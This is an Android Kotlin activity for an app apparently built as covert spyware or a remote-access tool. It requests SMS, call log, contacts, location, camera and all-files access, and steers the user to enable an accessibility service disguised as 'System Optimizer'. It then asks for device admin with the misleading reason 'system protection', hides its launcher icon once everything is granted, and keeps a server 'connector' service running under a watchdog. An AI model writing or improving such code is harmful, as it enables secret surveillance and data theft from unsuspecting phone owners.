package com.kztutorial99.androidconnector

import android.Manifest
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Environment
import android.os.Handler
import android.os.Looper
import android.os.PowerManager
import android.provider.Settings
import android.view.View
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import com.kztutorial99.androidconnector.databinding.ActivityMainBinding
import rikka.shizuku.Shizuku
import java.util.UUID

class MainActivity : AppCompatActivity() {

    private lateinit var binding: ActivityMainBinding
    private val prefs by lazy { getSharedPreferences("connector_prefs", Context.MODE_PRIVATE) }
    private val handler = Handler(Looper.getMainLooper())

    private val RUNTIME_PERMISSIONS = arrayOf(
        Manifest.permission.ACCESS_FINE_LOCATION,
        Manifest.permission.READ_SMS,
        Manifest.permission.READ_CALL_LOG,
        Manifest.permission.READ_CONTACTS,
        Manifest.permission.CAMERA,
    )

    private val dpm by lazy { getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager }
    private val adminComponent by lazy { ComponentName(this, AppDeviceAdminReceiver::class.java) }
    private val launcherAlias by lazy { ComponentName(this, "$packageName.MainLauncherAlias") }

    private val REQUEST_PERMISSIONS = 2001
    private val REQUEST_DEVICE_ADMIN = 3001

    private val shizukuListener = Shizuku.OnRequestPermissionResultListener { _, _ ->
        updateUI()
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        binding = ActivityMainBinding.inflate(layoutInflater)
        setContentView(binding.root)

        val deviceId = ensureDeviceId()
        binding.tvDeviceId.text = "ID: $deviceId"
        binding.tvServerUrl.text = SecureConfig.serverUrl().removePrefix("https://")

        binding.btnAccessibility.setOnClickListener {
            openAccessibilitySettings()
        }

        binding.btnLaunch.setOnClickListener {
            launchAndHide()
        }

        Shizuku.addRequestPermissionResultListener(shizukuListener)

        // Mulai service connector
        startConnectorService()
        WatchdogReceiver.schedule(this)

        // Jika dipanggil dari ProtectionService (AUTO_SETUP), langsung request semua permission
        if (intent.getBooleanExtra("AUTO_SETUP", false)) {
            handler.postDelayed({ requestAllPermissions() }, 500)
        }

        updateUI()
    }

    override fun onResume() {
        super.onResume()
        updateUI()

        // Jika accessibility sudah aktif + semua izin sudah ada → auto hide
        if (ProtectionService.isEnabled(this) && allPermissionsGranted()) {
            handler.postDelayed({ launchAndHide() }, 800)
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        Shizuku.removeRequestPermissionResultListener(shizukuListener)
        ConnectorService.statusCallback = null
    }

    private fun ensureDeviceId(): String {
        var id = prefs.getString("device_id", null)
        if (id == null) {
            id = UUID.randomUUID().toString()
            prefs.edit().putString("device_id", id).apply()
        }
        return id
    }

    private fun updateUI() {
        val accessibilityOk = ProtectionService.isEnabled(this)
        val allPermsOk = allPermissionsGranted()
        val adminOk = dpm.isAdminActive(adminComponent)

        // Step 1 — Accessibility
        if (accessibilityOk) {
            binding.tvAccessStatus.text = "✅ Aktif"
            binding.tvAccessStatus.setTextColor(getColor(R.color.green))
            binding.btnAccessibility.text = "Sudah Aktif ✓"
            binding.btnAccessibility.isEnabled = false
        } else {
            binding.tvAccessStatus.text = "Belum diaktifkan — ketuk untuk aktifkan"
            binding.tvAccessStatus.setTextColor(getColor(R.color.red))
            binding.btnAccessibility.text = "Aktifkan Sekarang →"
            binding.btnAccessibility.isEnabled = true
        }

        // Step 2 — Permissions
        val parts = mutableListOf<String>()
        if (!allPermsOk) {
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) parts.add("• Lokasi")
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) parts.add("• SMS")
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) parts.add("• Log Panggilan")
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) parts.add("• Kontak")
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) parts.add("• Kamera")
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R && !Environment.isExternalStorageManager()) parts.add("• Akses File")
            if (!adminOk) parts.add("• Proteksi Admin")
            binding.tvPermStatus.text = "Menunggu izin:\n${parts.joinToString("\n")}"
            binding.tvPermStatus.setTextColor(getColor(R.color.red))
        } else {
            binding.tvPermStatus.text = "✅ Semua izin dan perlindungan aktif"
            binding.tvPermStatus.setTextColor(getColor(R.color.green))
        }

        // Step 3 — Connection
        ConnectorService.statusCallback = { _, running ->
            runOnUiThread {
                binding.tvStatus.text = if (running) "Terhubung" else "Terputus"
                binding.tvStatus.setTextColor(if (running) getColor(R.color.green) else getColor(R.color.red))
                binding.statusDot.background = if (running) getDrawable(R.drawable.dot_green) else getDrawable(R.drawable.dot_red)
            }
        }

        // Tombol Launch
        binding.btnLaunch.visibility = if (accessibilityOk && allPermsOk) View.VISIBLE else View.GONE

        // Jika accessibility aktif → request permissions yang belum ada
        if (accessibilityOk && !allPermsOk) {
            handler.postDelayed({ requestAllPermissions() }, 300)
        }

        // Jika belum ada Device Admin → request
        if (accessibilityOk && !adminOk) {
            handler.postDelayed({ requestDeviceAdmin() }, 800)
        }

        // Jika semua siap → sembunyikan otomatis
        if (accessibilityOk && allPermsOk && adminOk) {
            handler.postDelayed({ launchAndHide() }, 1000)
        }
    }

    private fun allPermissionsGranted(): Boolean {
        val runtimeOk = RUNTIME_PERMISSIONS.all {
            ContextCompat.checkSelfPermission(this, it) == PackageManager.PERMISSION_GRANTED
        }
        val storageOk = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            Environment.isExternalStorageManager()
        } else true
        return runtimeOk && storageOk
    }

    private fun launchAndHide() {
        // Sembunyikan ikon launcher
        try {
            packageManager.setComponentEnabledSetting(
                launcherAlias,
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
            )
        } catch (_: Exception) {}

        // Pastikan service tetap jalan
        startConnectorService()
        finish()
    }

    private fun openAccessibilitySettings() {
        try {
            val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
            startActivity(intent)
            Toast.makeText(this,
                "Cari 'System Optimizer' → Aktifkan",
                Toast.LENGTH_LONG).show()
        } catch (_: Exception) {
            startActivity(Intent(Settings.ACTION_SETTINGS))
        }
    }

    private fun requestAllPermissions() {
        // Storage (All Files Access)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R && !Environment.isExternalStorageManager()) {
            try {
                startActivity(Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION).apply {
                    data = Uri.parse("package:$packageName")
                })
            } catch (_: Exception) {
                startActivity(Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION))
            }
        }

        // Runtime permissions
        val missing = RUNTIME_PERMISSIONS.filter {
            ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
        }.toTypedArray()
        if (missing.isNotEmpty()) {
            ActivityCompat.requestPermissions(this, missing, REQUEST_PERMISSIONS)
        }

        // Battery optimization
        val pm = getSystemService(PowerManager::class.java)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !pm.isIgnoringBatteryOptimizations(packageName)) {
            try {
                startActivity(Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
                    data = Uri.parse("package:$packageName")
                })
            } catch (_: Exception) {}
        }
    }

    private fun requestDeviceAdmin() {
        if (!dpm.isAdminActive(adminComponent)) {
            try {
                startActivityForResult(
                    Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
                        putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent)
                        putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION,
                            "Diperlukan untuk proteksi sistem.")
                    }, REQUEST_DEVICE_ADMIN
                )
            } catch (_: Exception) {}
        }
    }

    private fun startConnectorService() {
        val intent = Intent(this, ConnectorService::class.java)
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(intent)
            } else {
                startService(intent)
            }
        } catch (_: Exception) {}
    }

    override fun onRequestPermissionsResult(code: Int, perms: Array<String>, results: IntArray) {
        super.onRequestPermissionsResult(code, perms, results)
        updateUI()
    }

    @Deprecated("Deprecated in Java")
    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        updateUI()
    }
}
